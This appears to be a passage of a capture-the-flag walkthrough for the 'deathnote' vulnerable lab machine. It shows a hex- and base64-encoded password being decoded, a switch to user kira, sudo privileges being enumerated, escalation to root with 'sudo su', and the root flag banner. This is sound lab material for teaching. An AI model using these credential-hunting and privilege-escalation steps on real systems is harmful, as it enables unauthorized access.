+l@deathnote:/var/www/deathnote.vuln/wordpress$ cd /opt
+l@deathnote:/opt$ ls
+L
+l@deathnote:/opt$ cd L
+l@deathnote:/opt/L$ ls
+fake-notebook-rule  kira-case
+l@deathnote:/opt/L$ cd fake-notebook-rule/
+l@deathnote:/opt/L/fake-notebook-rule$ ls
+case.wav  hint
+l@deathnote:/opt/L/fake-notebook-rule$ cat hint
+use cyberchef
+
+l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav 
+63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
+l@deathnote:/opt/L/fake-notebook-rule$ 
+
+
+
+using HEX with space delimiter, we get this messageL cGFzc3dkIDoga2lyYWlzZXZpbCA=. This looks like base64
+
+Decoding it we get: passwd : kiraisevil 
+
+we can try to switch to kira user:
+l@deathnote:/opt/L/fake-notebook-rule$ su kira
+Password: 
+kira@deathnote:/opt/L/fake-notebook-rule$ 
+
+kira@deathnote:~$ cat kira.txt 
+cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
+
+
+kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 -d
+please protect one of the following 
+1. L (/opt)
+2. Misa (/var)kira@deathnote:~$ 
+
+
+kira@deathnote:~$ cd /var
+kira@deathnote:/var$ ls
+backups  cache  lib  local  lock  log  mail  misa  opt  run  spool  tmp  www
+kira@deathnote:/var$ cat misa 
+it is toooo late for misa 
+kira@deathnote:/var$ 
+
+kira@deathnote:/var$ sudo -l
+[sudo] password for kira: 
+Matching Defaults entries for kira on deathnote:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kira may run the following commands on deathnote:
+    (ALL : ALL) ALL
+kira@deathnote:/var$ sudo su
+root@deathnote:/var# 
+
+
+
+root flag:
+
+root@deathnote:/var# cd /root
+root@deathnote:~# ls
+root.txt
+root@deathnote:~# cat root.txt 
+
+
+      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
+    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
+   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
+  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
+ +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
+#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
+########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       
+
+##########follow me on twitter###########3
+and share this screen shot and tag @KDSAMF
+root@deathnote:~# 
+
+
+
+
+
+
+
+
+
+
